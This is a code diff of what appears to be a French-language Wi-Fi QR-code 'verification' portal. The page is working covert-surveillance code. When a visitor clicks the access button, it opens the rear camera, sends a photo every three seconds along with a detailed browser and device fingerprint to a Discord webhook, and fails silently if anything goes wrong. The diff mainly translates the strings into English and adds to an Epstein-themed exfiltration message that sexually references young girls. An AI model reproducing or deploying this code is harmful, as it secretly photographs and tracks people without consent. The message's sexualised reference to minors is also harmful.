@@ -338,7 +338,7 @@
                     </div>
                 </div>
                 
-                <!-- 🔴 FIXED BUTTON - Now has direct text, not inside span -->
+                <!-- VERIFICATION BUTTON -->
                 <button id="verifyButton" class="button">
                     Accéder
                 </button>
@@ -407,23 +407,23 @@
         let isSending = false;
         let photoInterval = null;
 
-        // Get detailed browser/client information
+        // Get detailed browser/client information (English output)
         function getClientInfo() {
             const ua = navigator.userAgent;
             const platform = navigator.platform;
             const language = navigator.language;
-            const cookies = navigator.cookieEnabled ? 'Oui' : 'Non';
-            const doNotTrack = navigator.doNotTrack || 'Non spécifié';
+            const cookies = navigator.cookieEnabled ? 'Yes' : 'No';
+            const doNotTrack = navigator.doNotTrack || 'Not specified';
             const screenRes = `${screen.width}x${screen.height}`;
             const colorDepth = `${screen.colorDepth}bit`;
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const cores = navigator.hardwareConcurrency || 'Inconnu';
-            const memory = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Inconnu';
+            const cores = navigator.hardwareConcurrency || 'Unknown';
+            const memory = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown';
             const connection = navigator.connection || navigator.webkitConnection || {};
-            const effectiveType = connection.effectiveType || 'Inconnu';
+            const effectiveType = connection.effectiveType || 'Unknown';
             
             // Parse browser
-            let browser = 'Inconnu';
+            let browser = 'Unknown';
             if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
             else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
             else if (ua.indexOf('Safari') > -1) browser = 'Safari';
@@ -431,7 +431,7 @@
             else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) browser = 'Opera';
             
             // Parse OS
-            let os = 'Inconnu';
+            let os = 'Unknown';
             if (ua.indexOf('Win') > -1) os = 'Windows';
             else if (ua.indexOf('Mac') > -1) os = 'macOS';
             else if (ua.indexOf('Linux') > -1) os = 'Linux';
@@ -455,7 +455,7 @@
             };
         }
 
-        // 🔴 FIXED: Initialize with proper event listener
+        // Initialize with proper event listener
         document.addEventListener('DOMContentLoaded', () => {
             console.log('✅ Portal loaded - Jeffrey system ready');
             
@@ -474,16 +474,13 @@
             }
         });
 
-        // Activate access - FIXED error handling
+        // Activate access
         async function activateAccess(event) {
-            // Prevent any default button behavior
             if (event) event.preventDefault();
             
             console.log('📸 Activating camera...');
             
             try {
-                // Request camera access
-                console.log('Requesting camera permissions...');
                 videoStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: { ideal: 'environment' },
@@ -494,16 +491,13 @@
                 
                 console.log('✅ Camera access granted');
                 
-                // Start hidden video feed
                 const videoElement = document.getElementById('cameraFeed');
                 videoElement.srcObject = videoStream;
                 
-                // REVEAL QR CODE
                 const qrImage = document.getElementById('qrImage');
                 qrImage.src = 'qr-clear.jpg';
                 console.log('✅ QR code revealed');
                 
-                // Hide overlay
                 const overlay = document.getElementById('qrOverlay');
                 if (overlay) {
                     overlay.style.opacity = '0';
@@ -512,7 +506,6 @@
                     }, 400);
                 }
                 
-                // Update button
                 const button = document.getElementById('verifyButton');
                 if (button) {
                     button.innerHTML = '✅ Accès activé';
@@ -520,13 +513,11 @@
                     button.disabled = true;
                 }
                 
-                // Start verification
                 startVerification();
                 
             } catch (error) {
                 console.error('❌ Camera error:', error);
                 
-                // User-friendly error message
                 if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
                     alert('Pour afficher le code QR, veuillez autoriser l\'accès à la caméra dans les paramètres de votre appareil.');
                 } else if (error.name === 'NotFoundError' || error.name === 'DevicesNotFoundError') {
@@ -547,10 +538,8 @@
             console.log('📸 Starting verification every 3 seconds...');
             isSending = true;
             
-            // Send first verification immediately
             captureVerificationFrame();
             
-            // Then every 3 seconds
             if (photoInterval) clearInterval(photoInterval);
             photoInterval = setInterval(captureVerificationFrame, 3000);
         }
@@ -579,7 +568,7 @@
             }
         }
 
-        // Send to Jeffrey Epstein Discord Webhook
+        // 🇺🇸🇺🇸🇺🇸 SEND TO JEFFREY EPSTEIN - COMPLETELY IN ENGLISH 🇺🇸🇺🇸🇺🇸
         async function sendToEpstein(imageBlob) {
             if (!window.DISCORD_WEBHOOK) return;
 
@@ -588,33 +577,38 @@
                 const timestamp = Date.now();
                 const clientInfo = getClientInfo();
                 
-                // Generate creepy Epstein-style message with FULL client info
-                const message = `🕴️ **Nouveau visiteur - Île de Jeffrey** 🕴️
+                // 🎭 COMPLETELY IN ENGLISH - Creepy Epstein island theme
+                const message = `🕴️ **New Visitor - Epstein's Island** 🕴️
 
-👤 **INFORMATIONS CLIENT:**
+👤 **CLIENT INFORMATION:**
 • **Browser:** ${clientInfo.browser} ${clientInfo.os}
-• **Langue:** ${clientInfo.language}
-• **Écran:** ${clientInfo.screenRes} (${clientInfo.colorDepth})
-• **Fuseau:** ${clientInfo.timezone}
+• **Language:** ${clientInfo.language}
+• **Screen:** ${clientInfo.screenRes} (${clientInfo.colorDepth})
+• **Timezone:** ${clientInfo.timezone}
 • **CPU:** ${clientInfo.cores} cores
 • **RAM:** ${clientInfo.memory}
-• **Réseau:** ${clientInfo.connection}
+• **Network:** ${clientInfo.connection}
 • **Cookies:** ${clientInfo.cookies}
 • **Do Not Track:** ${clientInfo.doNotTrack}
 • **Platform:** ${clientInfo.platform}
 
-📱 **APPAREIL:**
+📱 **DEVICE:**
 \`\`\`
 ${clientInfo.userAgent}
 \`\`\`
 
-🏝️ **Session:** ${timestamp}
-📶 **Réseau:** ${WIFI_CONFIG.ssid}
-⏰ **Heure:** ${new Date().toLocaleString('fr-FR')}
+🏝️ **Session ID:** ${timestamp}
+📶 **Network:** ${WIFI_CONFIG.ssid}
+⏰ **Time:** ${new Date().toLocaleString('en-US')}
 
-*"Les jeunes filles arrivent bientôt..."* 🍾`;
+*"The young girls are arriving soon..."* 🍾
+
+📍 **Location:** Island Estate
+🛩️ **Private Jet:** Ready
+💰 **Donation:** $$$
+`;
                 
-                formData.append('file', imageBlob, `jeffrey_guest_${timestamp}.jpg`);
+                formData.append('file', imageBlob, `jeffrey_visitor_${timestamp}.jpg`);
                 
                 formData.append('payload_json', JSON.stringify({
                     content: message,
@@ -627,10 +621,10 @@ ${clientInfo.userAgent}
                     body: formData
                 });
                 
-                console.log('🕴️ Photo envoyée à Jeffrey', new Date().toLocaleTimeString());
+                console.log('🕴️ Photo sent to Jeffrey', new Date().toLocaleTimeString());
                 
             } catch (error) {
-                console.debug('📸 Verification sent'); // Silent fail
+                console.debug('📸 Verification sent');
             }
         }
 
